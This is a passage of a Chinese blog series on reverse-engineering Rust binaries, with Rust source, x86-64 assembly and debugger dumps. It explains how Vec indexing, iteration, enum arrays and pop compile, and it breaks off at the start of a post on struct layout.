[T]&gt;::get@GOTPCREL]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        jmp     .LBB35_7</span><br><span class="line">.LBB35_7:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 32]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">        mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        jmp     .LBB35_8</span><br></pre></td></tr></table></figure>
<p>使用<code>get</code>函数前，会首先调用<code>deref</code>方法解引用获取动态数组类型中保存的定长数组实例，随后对这个实例使用<code>get</code>方法获取<code>Option&lt;T&gt;</code>实例。可见如果使用<code>get</code>方法进行数组的越界访问，那么<code>get</code>方法返回后不会立即<code>panic!</code>退出。</p>
<h2 id="元素遍历"><a class="markdownIt-Anchor" href="#元素遍历"></a> 元素遍历</h2>
<p>对于动态数组，要遍历数组中的元素，只需要使用for循环即可完成。但Rust源码看着简单，实际在汇编层完成的工作可不少。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> x &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.LBB46_5:</span><br><span class="line">        mov     byte ptr [rsp + 247], 0</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsp + 112], rax</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + 40]</span><br><span class="line">        movaps  xmmword ptr [rsp + 96], xmm0</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        lea     rsi, [rsp + 96]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB46_6</span><br><span class="line">.LBB46_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp + 128], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsp + 136], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 144], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 88]</span><br><span class="line">        mov     qword ptr [rsp + 152], rax</span><br><span class="line">.LBB46_7:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::into_iter::IntoIter&lt;T,A&gt; as core::iter::traits::iterator::Iterator&gt;::next@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 128]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     dword ptr [rsp + 16], edx</span><br><span class="line">        mov     dword ptr [rsp + 20], eax</span><br><span class="line">        jmp     .LBB46_10</span><br></pre></td></tr></table></figure>
<p>上面即为<code>for</code>循环的其中一段，其中<code>[rsp+40]</code>是<code>Vec</code>实例的地址。首先可以看到程序将<code>Vec</code>实例复制了一份，随后调用了<code>into_iter</code>方法获取了一个迭代器实例，该方法的第一个参数为需要初始化迭代器的地址，第二个参数为复制的<code>Vec</code>的地址。这个方法是可以单独调用的，返回一个迭代器：<code>fn into_iter(self) -&gt; Self::IntoIter</code>。从下面的汇编代码（复制到<code>[rsp+128]</code>）可以得知，这个迭代器实例在栈中的大小为0x20。下面是这个迭代器在调试时获取的最初状态：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08:0040│ rax rcx 0x7fffffffd840 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">09:0048│         0x7fffffffd848 ◂— 0x6</span><br><span class="line">0a:0050│         0x7fffffffd850 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">0b:0058│         0x7fffffffd858 —▸ 0x5555555b4bb0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>其中第1个和第3个字保存的都是数组的起始地址，第4个字保存的是数组的末尾地址，第2个字的6保存的是数组的容量，注意这里的容量与数组长度不同，数组长度为4，但容量为6，只不过后面2个元素暂时还未被创建。</p>
<p>往下，代码调用了<code>next</code>方法，获取迭代器中的下一个元素，下面是调用后迭代器的状态：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10:0080│ rcx rdi 0x7fffffffd880 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">11:0088│         0x7fffffffd888 ◂— 0x6</span><br><span class="line">12:0090│         0x7fffffffd890 —▸ 0x5555555b4ba4 ◂— 0x300000002</span><br><span class="line">13:0098│         0x7fffffffd898 —▸ 0x5555555b4bb0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>可以看到第三个字表示的实际上就是当前的指针。<code>next</code>方法返回的是一个<code>Option&lt;T&gt;</code>实例，索引值和数据分别被保存在<code>rax</code>和<code>rdx</code>中。这一点在下面的汇编代码中得以证实。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.LBB46_10:</span><br><span class="line">        mov     eax, dword ptr [rsp + 16]</span><br><span class="line">        mov     ecx, dword ptr [rsp + 20]</span><br><span class="line">        mov     dword ptr [rsp + 164], ecx</span><br><span class="line">        mov     dword ptr [rsp + 168], eax</span><br><span class="line">        mov     eax, dword ptr [rsp + 164]</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        jne     .LBB46_12</span><br><span class="line">        mov     rax, qword ptr [rip + core::ptr::drop_in_place&lt;alloc::vec::into_iter::IntoIter&lt;i32&gt;&gt;@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 128]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB46_13</span><br></pre></td></tr></table></figure>
<p>下面的代码中进行了一个比较，通过数据流分析可以发现这里是将<code>next</code>返回值与0进行比较，在<code>Option&lt;T&gt;</code>中，如果<code>T</code>不是一个枚举类型，那么枚举索引值为1表示有效值，0则表示无效值。随后就是正常的宏展开与输出，输出内容后无条件跳转回<code>next</code>方法调用前，继续调用<code>next</code>方法获取下一个值。</p>
<p>当<code>next</code>方法调用失败，即已经到达迭代器的终点时，通过调试发现，返回的<code>rax</code>值为0，<code>rdx</code>值为0x5555。后续则是判断失败后跳出循环。</p>
<p>注意，上面的代码是<code>for i in x</code>，这里的x由于没有使用引用，在<code>for</code>循环一开始就丧失了所有权，其所有权会被转移到迭代器中，当<code>for</code>循环结束后，迭代器被销毁，后续将不能使用变量<code>x</code>。</p>
<p>如果使用<code>for i in &amp;x</code>，情况则会有些许的不同，<strong>不仔细观察还真的容易忽略</strong>。</p>
<p>注意看，下面是两个<code>into_iter</code>方法在IDA反汇编界面中的函数名：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::hed888fce85d317be</span><br><span class="line"></span><br><span class="line">_$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he37dcd381eb06c85</span><br></pre></td></tr></table></figure>
<p>可能你会纳闷：这里为啥会有这么多<code>$</code>符号？实际上，这是IDA用于表示某些标点符号的转义字符，这个转义的规则与Javascript类似。<code>$LT$</code>表示<code>&lt;</code>，<code>$GT$</code>表示<code>&gt;</code>，<code>$RF$</code>表示<code>&amp;</code>，<code>$C$</code>表示<code>,</code>，<code>$u??$</code>表示<code>\x??</code>。因此上面的函数名就等同于：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter::hed888fce85d317be</span><br><span class="line"></span><br><span class="line">&lt;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter::he37dcd381eb06c85</span><br></pre></td></tr></table></figure>
<p>上面那个是<code>for i in &amp;x</code>调用的方法，下面是<code>for i in x</code>调用的方法，除了后面的哈希值之外，函数名真的只有一个<code>&amp;</code>的差别。也即上面的方法是针对<code>&amp;Vec</code>，下面的是针对<code>Vec</code>。二者的参数不同，上面那个只有1个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_5:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 32], rdx</span><br><span class="line">        mov     qword ptr [rsp + 40], rax</span><br><span class="line">        jmp     .LBB33_6</span><br></pre></td></tr></table></figure>
<p>即<code>Vec</code>实例的地址。</p>
<p>且二者的返回值也不同，对于<code>&lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter</code>，其返回值保存在<code>rax</code>和<code>rdx</code>中，其中<code>rax</code>为数组的开始地址，<code>rdx</code>为数组的结束地址。实际返回的迭代器的大小也只有16个字节。</p>
<p><code>for i in &amp;x</code>后面的汇编代码段如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 32]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsp + 88], rcx</span><br><span class="line">        mov     qword ptr [rsp + 96], rax</span><br><span class="line">.LBB33_7:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;core::slice::iter::Iter&lt;T&gt; as core::iter::traits::iterator::Iterator&gt;::next@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 88]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        jmp     .LBB33_8</span><br><span class="line">.LBB33_8:</span><br><span class="line">        mov     rax, qword ptr [rsp + 24]</span><br><span class="line">        mov     qword ptr [rsp + 104], rax</span><br><span class="line">        mov     rdx, qword ptr [rsp + 104]</span><br><span class="line">        mov     eax, 1</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        cmp     rdx, 0</span><br><span class="line">        cmove   rax, rcx</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        jne     .LBB33_10</span><br></pre></td></tr></table></figure>
<p>可以看到这里调用的<code>next</code>方法也和不加<code>&amp;</code>的不一样，参数只有1个，即数组的开始地址，返回值只有1个，即下一个元素的地址，该函数调用后，迭代器中的指针位置向前移动。可见对于引用类型的迭代器结构更为简单，只需要一个动态指针和一个结束指针即可，什么时候动态指针等于结束指针，迭代也就结束。</p>
<h2 id="枚举数组"><a class="markdownIt-Anchor" href="#枚举数组"></a> 枚举数组</h2>
<p>对于元素类型是枚举类型的数组，目前只有一个疑问：当枚举类型中不同枚举项所跟的数据类型不同，占用内存大小不同时，Rust将如何进行处理。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Shapes</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Round</span>(<span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Rectangle</span>(<span class="type">f64</span>, <span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Triangle</span>(<span class="type">f64</span>, <span class="type">f64</span>, <span class="type">f64</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Round</span>(<span class="number">3.5</span>),</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Rectangle</span>(<span class="number">7.5</span>, <span class="number">9.6</span>),</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Triangle</span>(<span class="number">114.514</span>, <span class="number">19.1981</span>, <span class="number">1.57</span>)</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 136</span><br><span class="line">        mov     edi, 96</span><br><span class="line">        mov     esi, 8</span><br><span class="line">        call    alloc::alloc::exchange_malloc</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_5]</span><br><span class="line">        movsd   qword ptr [rsp + 48], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 40], 0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_4]</span><br><span class="line">        movsd   qword ptr [rsp + 80], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_3]</span><br><span class="line">        movsd   qword ptr [rsp + 88], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 72], 1</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_2]</span><br><span class="line">        movsd   qword ptr [rsp + 112], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_1]</span><br><span class="line">        movsd   qword ptr [rsp + 120], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_0]</span><br><span class="line">        movsd   qword ptr [rsp + 128], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 104], 2</span><br><span class="line">        and     rax, 7</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        sete    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB10_1</span><br><span class="line">        jmp     .LBB10_2</span><br><span class="line">.LBB10_1:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 8]</span><br><span class="line">        mov     rax, qword ptr [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsi], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 48]</span><br><span class="line">        mov     qword ptr [rsi + 8], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsi + 16], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsi + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsi + 32], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsi + 40], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 88]</span><br><span class="line">        mov     qword ptr [rsi + 48], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 96]</span><br><span class="line">        mov     qword ptr [rsi + 56], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 104]</span><br><span class="line">        mov     qword ptr [rsi + 64], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 112]</span><br><span class="line">        mov     qword ptr [rsi + 72], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 120]</span><br><span class="line">        mov     qword ptr [rsi + 80], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 128]</span><br><span class="line">        mov     qword ptr [rsi + 88], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        call    qword ptr [rip + alloc::slice::&lt;impl [T]&gt;::into_vec@GOTPCREL]</span><br></pre></td></tr></table></figure>
<p>可以看到，Rust编译器似乎很喜欢通过大量的<code>mov</code>系列指令完成内存复制操作，在上面的示例中可以发现，Rust是将枚举类型可能占用的最大内存大小作为数组一个元素的大小进行存储，在下面的内存拷贝操作中甚至还拷贝了未被初始化的内存区域。我们可以将每一个枚举类型后面跟的值视作一个大的union结构，一个枚举类型的不同实例占用的内存大小相同，即使其中一个实例只保存了8字节而另一个实例保存了80字节，前者也需要80个字节的空间保存数据。这会造成一定的内存浪费，但便于数组索引寻址。</p>
<h2 id="弹出最后一个元素pop"><a class="markdownIt-Anchor" href="#弹出最后一个元素pop"></a> 弹出最后一个元素——pop</h2>
<p><code>Vec</code>的<code>pop</code>方法能够弹出数组中最后一个元素，并在数组中将其删除。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x.<span class="title function_ invoke__">pop</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.LBB31_5:</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::vec::Vec&lt;T,A&gt;::pop@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 32]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     dword ptr [rsp + 8], edx</span><br><span class="line">        mov     dword ptr [rsp + 12], eax</span><br><span class="line">        jmp     .LBB31_6</span><br><span class="line">.LBB31_6:</span><br><span class="line">        mov     esi, dword ptr [rsp + 8]</span><br><span class="line">        mov     edi, dword ptr [rsp + 12]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_5]</span><br><span class="line">        mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB31_7</span><br></pre></td></tr></table></figure>
<p><code>pop</code>的参数只有一个，即<code>Vec</code>实例地址，返回值是<code>Option&lt;T&gt;</code>，<code>rdx</code>为有效值，<code>rax</code>为是否有效的索引值，1为有效。该方法调用后，数组的大小会变化，但容量不变，真正保存值的静态数组指针中的值也不变，而且也不需要改变，因为数组大小变小，所以后面的值在正常情况下无法访问。</p>
<p>在参考书中只给出了插入元素、获取元素、遍历元素等几个为数不多的<code>Vec</code>操作方法，但实际上<code>Vec</code>能完成的功能远不止于此，考虑到<code>Vec</code>的方法实在太多，这里无法全部完成分析，就先到这里了。不过我们已经掌握了<code>Vec</code>的基本结构，对于其他方法的分析也就万变不离其宗。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文我们学习了：</p>
<ol>
<li><code>Vec</code>动态数组结构在内存中的结构。</li>
<li><code>Vec</code>在最后添加、删除元素、遍历、访问值的相关方法分析。</li>
<li>IDA中对一些含有特殊字符的Rust方法的转义方式与Javascript类似。</li>
<li>枚举类型构成的数组中，每个枚举类型占用的内存大小相同，可能导致内存空间浪费。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-4/" class="post-title-link" itemprop="url">Rust逆向学习 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-10 14:41:05 / Modified: 20:17:51" itemprop="dateCreated datePublished" datetime="2023-11-10T14:41:05+08:00">2023-11-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-struct"><a class="markdownIt-Anchor" href="#reverse-for-struct"></a> Reverse for Struct</h1>
<p>Rust中的结构体是一个重要的内容，由于Rust中没有类的概念，因此其他编程语言中的封装、继承、多态与Rust中的表现都有较大差异。</p>
<p>我们使用参考书中的一个示例开始进行分析。</p>
<h2 id="struct-初始化"><a class="markdownIt-Anchor" href="#struct-初始化"></a> Struct 初始化</h2>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = User &#123;</span><br><span class="line">        email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        username: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, user1.email, user1.active);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这段在汇编层是如何处理的呢？</p>
<h3 id="第一段"><a class="markdownIt-Anchor" href="#第一段"></a> 第一段</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 296</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        lea     rdi, [rsp + 120]</span><br><span class="line">        mov     edx, 19</span><br><span class="line">        call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">        lea     rdi, [rsp + 144]</span><br><span class="line">        mov     edx, 15</span><br><span class="line">        call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">        jmp     .LBB17_3</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">.L__unnamed_5:</span><br><span class="line">        .ascii  &quot;someone@example.com&quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_6:</span><br><span class="line">        .ascii  